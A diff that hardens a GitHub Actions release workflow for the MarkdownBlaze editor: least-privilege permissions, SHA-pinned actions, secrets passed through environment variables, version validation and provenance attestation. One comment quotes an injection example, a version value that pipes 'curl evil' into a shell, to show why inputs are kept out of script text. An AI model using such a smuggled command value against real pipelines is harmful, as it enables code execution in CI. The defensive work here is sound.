@@ -17,8 +17,9 @@ on:
         type: boolean
         default: false
 
-permissions:
-  contents: write
+# Nothing is allowed by default. Each job asks for exactly what it uses: reading the repository to
+# build it, and — only for the jobs that publish — writing to it.
+permissions: {}
 
 env:
   PROJECT: src/MarkdownBlaze/MarkdownBlaze.csproj
@@ -26,23 +27,43 @@ env:
 jobs:
   setup:
     runs-on: ubuntu-latest
+    permissions: {}
     outputs:
       version: ${{ steps.v.outputs.version }}
     steps:
       - id: v
+        # The input reaches the script through the environment, never through ${{ }} in the script
+        # text: an expression is pasted into the script before the shell parses it, so a version such
+        # as `1"; curl evil | sh; "` would be code. As an environment variable it is only data, and it
+        # is checked against a version-shaped pattern before anything else uses it.
+        env:
+          VERSION_INPUT: ${{ inputs.version }}
+          RUN_NUMBER: ${{ github.run_number }}
         run: |
-          if [ -n "${{ inputs.version }}" ]; then v="${{ inputs.version }}"; else v="1.0.${{ github.run_number }}"; fi
+          set -euo pipefail
+          if [ -n "$VERSION_INPUT" ]; then v="$VERSION_INPUT"; else v="1.0.$RUN_NUMBER"; fi
+          if ! printf '%s' "$v" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$'; then
+            echo "::error::'$v' is not a version (expected e.g. 1.2.3 or 1.2.3-rc.1)"
+            exit 1
+          fi
           echo "version=$v" >> "$GITHUB_OUTPUT"
           echo "Release version: $v"
 
   windows:
     needs: setup
     runs-on: windows-latest
+    permissions:
+      contents: read
     env:
       VERSION: ${{ needs.setup.outputs.version }}
+    outputs:
+      cert_thumbprint: ${{ steps.msix.outputs.cert_thumbprint }}
+      cert_kind: ${{ steps.msix.outputs.cert_kind }}
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-dotnet@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+      - uses: actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9 # v4.3.1
         with:
           dotnet-version: '10.0.x'
 
@@ -55,22 +76,30 @@ jobs:
         run: Compress-Archive -Path publish/win-x64/* -DestinationPath "MarkdownBlaze-$env:VERSION-win-x64.zip"
 
       # Installer (registers the .md / .markdown association); this is what winget installs.
+      # Inno Setup is pinned: a release must not change because the Chocolatey feed moved.
       - name: Build installer (Inno Setup)
         shell: pwsh
         run: |
-          choco install innosetup --no-progress -y
+          choco install innosetup --version 6.7.1 --no-progress -y
           & "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" "/DMyAppVersion=$env:VERSION" "/DPublishDir=$env:GITHUB_WORKSPACE\publish\win-x64" "/O$env:GITHUB_WORKSPACE" packaging\windows\MarkdownBlaze.iss
 
-      # Package the same publish output as a self-signed, sideloadable MSIX. (For the Store, replace
-      # the self-signed cert with your Partner Center identity / a real code-signing cert.)
-      - name: Build MSIX (self-signed)
+      # Package the same publish output as a sideloadable MSIX, signed with the certificate kept in the
+      # MSIX_SIGNING_PFX / MSIX_SIGNING_PASSWORD secrets (see packaging/README.md) so that every release
+      # carries the same signature. Without them a self-signed certificate is made for this run, which
+      # is what the workflow did before; its thumbprint is then different each time. (For the Store the
+      # certificate does not matter: the Store re-signs the package.)
+      - name: Build MSIX
+        id: msix
         shell: pwsh
+        env:
+          MSIX_SIGNING_PFX: ${{ secrets.MSIX_SIGNING_PFX }}
+          MSIX_SIGNING_PASSWORD: ${{ secrets.MSIX_SIGNING_PASSWORD }}
         run: |
           $pub = "publish/win-x64"
           New-Item -ItemType Directory -Force "$pub/Images" | Out-Null
           Add-Type -AssemblyName System.Drawing
-          # Store tile logos, resized from the real app icon in resources/.
-          $srcImg = [System.Drawing.Image]::FromFile("$env:GITHUB_WORKSPACE/resources/md_512.png")
+          # Store tile logos, resized from the real app icon in branding/.
+          $srcImg = [System.Drawing.Image]::FromFile("$env:GITHUB_WORKSPACE/branding/icon-512.png")
           function Logo($w,$h,$path){ $b=New-Object System.Drawing.Bitmap $w,$h; $g=[System.Drawing.Graphics]::FromImage($b); $g.InterpolationMode='HighQualityBicubic'; $g.SmoothingMode='HighQuality'; $g.PixelOffsetMode='HighQuality'; $g.Clear([System.Drawing.Color]::Transparent); $g.DrawImage($srcImg,(New-Object System.Drawing.Rectangle 0,0,$w,$h)); $b.Save($path,[System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $b.Dispose() }
           Logo 44 44 "$pub/Images/Square44x44Logo.png"
           Logo 150 150 "$pub/Images/Square150x150Logo.png"
@@ -82,13 +111,34 @@ jobs:
           $signtool = Join-Path $sdk.FullName "x64/signtool.exe"
           $msix = "MarkdownBlaze-$env:VERSION-win-x64.msix"
           & $makeappx pack /o /d $pub /p $msix
-          # Self-sign with a cert whose subject matches the manifest Publisher (required for sideload).
+
+          # The certificate's subject has to match the manifest Publisher, or the package cannot be sideloaded.
           [xml]$m = Get-Content "$pub/AppxManifest.xml"
-          $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject $m.Package.Identity.Publisher -CertStoreLocation Cert:\CurrentUser\My -NotAfter (Get-Date).AddYears(5)
+          $publisher = $m.Package.Identity.Publisher
+          if ($env:MSIX_SIGNING_PFX) {
+              $kind = "repository secret"
+              $pfx = Join-Path $env:RUNNER_TEMP "msix-signing.pfx"
+              [IO.File]::WriteAllBytes($pfx, [Convert]::FromBase64String($env:MSIX_SIGNING_PFX))
+              # Imported into the store and signed by thumbprint, so the password never appears on a command line.
+              $password = ConvertTo-SecureString -String $env:MSIX_SIGNING_PASSWORD -AsPlainText -Force
+              $cert = Import-PfxCertificate -FilePath $pfx -Password $password -CertStoreLocation Cert:\CurrentUser\My
+              Remove-Item $pfx -Force
+              if ($cert.Subject -ne $publisher) {
+                  throw "The certificate in MSIX_SIGNING_PFX has the subject '$($cert.Subject)', but AppxManifest.xml says Publisher='$publisher'."
+              }
+          } else {
+              $kind = "self-signed for this run"
+              Write-Warning "MSIX_SIGNING_PFX is not set: signing with a new self-signed certificate."
+              $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject $publisher -CertStoreLocation Cert:\CurrentUser\My -NotAfter (Get-Date).AddYears(5)
+          }
           & $signtool sign /fd SHA256 /sha1 $cert.Thumbprint $msix
           Export-Certificate -Cert $cert -FilePath "MarkdownBlaze-$env:VERSION.cer" | Out-Null
 
-      - uses: actions/upload-artifact@v4
+          "cert_thumbprint=$($cert.Thumbprint)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
+          "cert_kind=$kind" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
+          "MSIX signed with certificate $($cert.Thumbprint) ($kind)" | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append -Encoding utf8
+
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
           name: windows
           path: |
@@ -100,11 +150,15 @@ jobs:
   linux:
     needs: setup
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
     env:
       VERSION: ${{ needs.setup.outputs.version }}
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-dotnet@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+      - uses: actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9 # v4.3.1
         with:
           dotnet-version: '10.0.x'
 
@@ -116,7 +170,7 @@ jobs:
             dotnet publish "$PROJECT" -c Release -r "$rid" --self-contained true -p:Version="$VERSION" -o "$out"
             # Bundle the desktop entry + icon so the tarball is self-contained for packaging.
             cp packaging/linux/MarkdownBlaze.desktop "$out/MarkdownBlaze.desktop"
-            cp src/MarkdownBlaze/Assets/icon.svg "$out/MarkdownBlaze.svg"
+            cp branding/icon.svg "$out/MarkdownBlaze.svg"
             chmod +x "$out/MarkdownBlaze" || true
             tar -czf "$out.tar.gz" "$out"
           done
@@ -124,7 +178,7 @@ jobs:
       - name: Build .deb (x64)
         run: bash packaging/linux/build-deb.sh "$VERSION" "MarkdownBlaze-$VERSION-linux-x64"
 
-      - uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
           name: linux
           path: |
@@ -134,14 +188,18 @@ jobs:
   macos:
     needs: setup
     runs-on: macos-latest
+    permissions:
+      contents: read
     # Optional: macOS bundling/signing is best-effort. If it fails, the release is still created
     # (just without the .dmg) rather than blocking every other platform.
     continue-on-error: true
     env:
       VERSION: ${{ needs.setup.outputs.version }}
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-dotnet@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+      - uses: actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9 # v4.3.1
         with:
           dotnet-version: '10.0.x'
 
@@ -152,9 +210,9 @@ jobs:
           # Build a multi-resolution .icns from the app icon.
           mkdir -p icon.iconset
           for s in 16 32 128 256 512; do
-            sips -z $s $s resources/md_512.png --out "icon.iconset/icon_${s}x${s}.png" >/dev/null
+            sips -z $s $s branding/icon-512.png --out "icon.iconset/icon_${s}x${s}.png" >/dev/null
             d=$((s * 2))
-            sips -z $d $d resources/md_512.png --out "icon.iconset/icon_${s}x${s}@2x.png" >/dev/null
+            sips -z $d $d branding/icon-512.png --out "icon.iconset/icon_${s}x${s}@2x.png" >/dev/null
           done
           iconutil -c icns icon.iconset -o MarkdownBlaze.icns
 
@@ -189,7 +247,7 @@ jobs:
               "MarkdownBlaze-$VERSION-$rid.dmg"
           done
 
-      - uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
           name: macos
           path: MarkdownBlaze-*-osx-*.dmg
@@ -197,10 +255,17 @@ jobs:
   release:
     needs: [setup, windows, linux, macos, archpkg]
     runs-on: ubuntu-latest
+    permissions:
+      contents: write # create the release and upload the files to it
+      id-token: write # attest-build-provenance signs the attestation with the workflow's identity
+      attestations: write # ... and stores it
     env:
       VERSION: ${{ needs.setup.outputs.version }}
+      CERT_THUMBPRINT: ${{ needs.windows.outputs.cert_thumbprint }}
+      CERT_KIND: ${{ needs.windows.outputs.cert_kind }}
+      REPO: ${{ github.repository }}
     steps:
-      - uses: actions/download-artifact@v4
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
         with:
           path: dist
 
@@ -211,11 +276,66 @@ jobs:
             | xargs -0 sha256sum > ../SHA256SUMS
           cat ../SHA256SUMS
 
+      # Where the files came from: a signed statement, tied to this workflow run, that GitHub keeps
+      # next to the repository. `gh attestation verify <file> --repo <owner>/<repo>` checks it. The
+      # installer and the zip are not code-signed, so this is how a downloader can tell they are ours.
+      - name: Attest build provenance
+        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
+        with:
+          subject-path: |
+            dist/**/*.zip
+            dist/**/*.tar.gz
+            dist/**/*.deb
+            dist/**/*.pkg.tar.zst
+            dist/**/*.dmg
+            dist/**/*.msix
+            dist/**/*-setup.exe
+
+      # Written to a file from the environment (not pasted into the script) and used as the start of
+      # the release notes; the generated notes follow.
+      #
+      # It also says which of the expected files are in this release. The macOS job is allowed to fail
+      # without stopping the release (continue-on-error), and a release that quietly lacks the .dmg
+      # should say so rather than leave the reader to notice. A missing file is a warning on the run too.
+      - name: Write release notes header
+        run: |
+          # present <label> <file name pattern>: one line of the inventory, and a note for the run if the file is not there.
+          present() {
+            if [ -n "$(find dist -type f -name "$2" -print -quit)" ]; then
+              echo "- $1: included"
+            else
+              echo "- $1: **not in this release** (its build did not produce it)"
+              echo "::warning::$1 ($2) is not in this release" >&2
+            fi
+          }
+          {
+            echo "### Signing"
+            echo
+            echo "- MSIX certificate thumbprint (SHA-1): \`$CERT_THUMBPRINT\` ($CERT_KIND)"
+            echo "- The installer and the zip are not code-signed. Their provenance is attested: \`gh attestation verify <file> --repo $REPO\`"
+            echo "- \`SHA256SUMS\` lists the checksum of every file."
+            echo
+            echo "### Files in this release"
+            echo
+            present "Windows installer" '*-win-x64-setup.exe'
+            present "Windows portable zip" '*-win-x64.zip'
+            present "Windows MSIX" '*-win-x64.msix'
+            present "MSIX certificate" '*.cer'
+            present "Linux x64 tarball" '*-linux-x64.tar.gz'
+            present "Linux arm64 tarball" '*-linux-arm64.tar.gz'
+            present "Debian package" '*.deb'
+            present "Arch package" '*.pkg.tar.zst'
+            present "macOS Apple Silicon disk image" '*-osx-arm64.dmg'
+            present "macOS Intel disk image" '*-osx-x64.dmg'
+          } > release-header.md
+          cat release-header.md
+
       - name: Create GitHub release
-        uses: softprops/action-gh-release@v2
+        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2.6.2
         with:
           tag_name: v${{ env.VERSION }}
           name: MarkdownBlaze ${{ env.VERSION }}
+          body_path: release-header.md
           generate_release_notes: true
           files: |
             dist/**/*.zip
@@ -232,6 +352,10 @@ jobs:
     needs: [setup, release]
     if: ${{ inputs.publish_winget }}
     runs-on: ubuntu-latest
+    # The PAT in WINGET_TOKEN does the writing (to a fork of winget-pkgs); the workflow's own token
+    # only has to read.
+    permissions:
+      contents: read
     steps:
       # komac (used by winget-releaser) branches the update from upstream's HEAD commit, so that
       # commit must already exist in our fork. A stale fork fails with a misleading
@@ -260,7 +384,7 @@ jobs:
 
       # Opens an update PR to microsoft/winget-pkgs for the portable zip.
       # The package must already exist there (seed the first version manually — see packaging/winget).
-      - uses: vedantmgoyal9/winget-releaser@v2
+      - uses: vedantmgoyal9/winget-releaser@f29ed1ffd34f91223a2aebaa71beaab0901ff9fd # v2
         with:
           identifier: GregoryKieffer.MarkdownBlaze
           version: ${{ needs.setup.outputs.version }}
@@ -272,59 +396,78 @@ jobs:
     needs: [setup, windows]
     if: ${{ inputs.publish_store }}
     runs-on: windows-latest
+    permissions: {}
     steps:
-      - uses: actions/download-artifact@v4
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
         with:
           name: windows
           path: dist
       - name: Set up Microsoft Store Developer CLI
-        uses: microsoft/microsoft-store-apppublisher@v1.1
+        uses: microsoft/microsoft-store-apppublisher@15abd1c50fcc164b19cb240fb04ef3c49bf715a2 # v1.1
+      # The credentials go through the environment, so they are not part of the script text; the
+      # client secret is the one value the CLI takes as an argument.
       - name: Configure credentials
+        shell: pwsh
+        env:
+          AZURE_AD_TENANT_ID: ${{ secrets.AZURE_AD_TENANT_ID }}
+          SELLER_ID: ${{ secrets.SELLER_ID }}
+          AZURE_AD_APPLICATION_CLIENT_ID: ${{ secrets.AZURE_AD_APPLICATION_CLIENT_ID }}
+          AZURE_AD_APPLICATION_SECRET: ${{ secrets.AZURE_AD_APPLICATION_SECRET }}
         run: >
           msstore reconfigure
-          --tenantId ${{ secrets.AZURE_AD_TENANT_ID }}
-          --sellerId ${{ secrets.SELLER_ID }}
-          --clientId ${{ secrets.AZURE_AD_APPLICATION_CLIENT_ID }}
-          --clientSecret ${{ secrets.AZURE_AD_APPLICATION_SECRET }}
+          --tenantId "$env:AZURE_AD_TENANT_ID"
+          --sellerId "$env:SELLER_ID"
+          --clientId "$env:AZURE_AD_APPLICATION_CLIENT_ID"
+          --clientSecret "$env:AZURE_AD_APPLICATION_SECRET"
       - name: Publish package to the Store
         shell: pwsh
+        env:
+          STORE_PRODUCT_ID: ${{ secrets.STORE_PRODUCT_ID }}
         run: |
           $msix = (Get-ChildItem dist -Recurse -Filter *.msix | Select-Object -First 1).FullName
-          msstore publish "$msix" -id ${{ secrets.STORE_PRODUCT_ID }}
+          msstore publish "$msix" -id "$env:STORE_PRODUCT_ID"
 
   # Native Arch package (.pkg.tar.zst) — built before the release from the locally-built tarball,
   # then included in the release alongside the .deb. Installable with `pacman -U`, no AUR needed.
   archpkg:
     needs: [setup, linux]
     runs-on: ubuntu-latest
-    container: archlinux:base-devel
+    permissions:
+      contents: read
+    # A rolling distribution cannot be pinned package by package, so the image is: tag and digest. The
+    # `pacman -Syu` below still moves to the packages current today; bump the image with the release.
+    container: archlinux:base-devel-20261004.0.606936@sha256:996c3a1d6b0d87b01242f6fcd8cfa3ad3eece1a67ab5c8f108e20af1d7b97bdd
+    env:
+      VERSION: ${{ needs.setup.outputs.version }}
     steps:
       - name: Install git (for checkout)
         run: pacman -Syu --noconfirm git
-      - uses: actions/checkout@v4
-      - uses: actions/download-artifact@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
         with:
           name: linux
           path: linux
       - name: Build pacman package (from the local tarball)
         run: |
           set -euo pipefail
-          ver="${{ needs.setup.outputs.version }}"
+          ver="$VERSION"
           useradd -m builder
           build=/home/builder/build
           install -d -o builder "$build"
           # Place the locally-built tarball under the name the PKGBUILD source expects, so makepkg
           # uses it instead of downloading the (not-yet-published) release URL.
-          cp "linux/MarkdownBlaze-$ver-linux-x64.tar.gz" "$build/MarkdownBlaze-$ver.tar.gz"
-          sha=$(sha256sum "$build/MarkdownBlaze-$ver.tar.gz" | cut -d' ' -f1)
-          sed -e "s/__VERSION__/$ver/g" -e "s/__SHA256__/$sha/g" packaging/aur/PKGBUILD.template > "$build/PKGBUILD"
+          cp "linux/MarkdownBlaze-$ver-linux-x64.tar.gz" "$build/markdownblaze-$ver.tar.gz"
+          sha=$(sha256sum "$build/markdownblaze-$ver.tar.gz" | cut -d' ' -f1)
+          sed -e "s/__VERSION__/$ver/g" -e "s/__SHA256__/$sha/g" packaging/arch/PKGBUILD.template > "$build/PKGBUILD"
           chown -R builder:builder "$build"
           # --nodeps: runtime libs (gtk3, webkit2gtk-4.1) aren't needed to repackage a prebuilt
           # binary; they remain declared so `pacman -U` resolves them on install.
           sudo -u builder bash -c "cd '$build' && makepkg -f --nodeps --noconfirm"
           cp "$build"/*.pkg.tar.zst .
           ls -1 *.pkg.tar.zst
-      - uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
           name: arch
           path: '*.pkg.tar.zst'
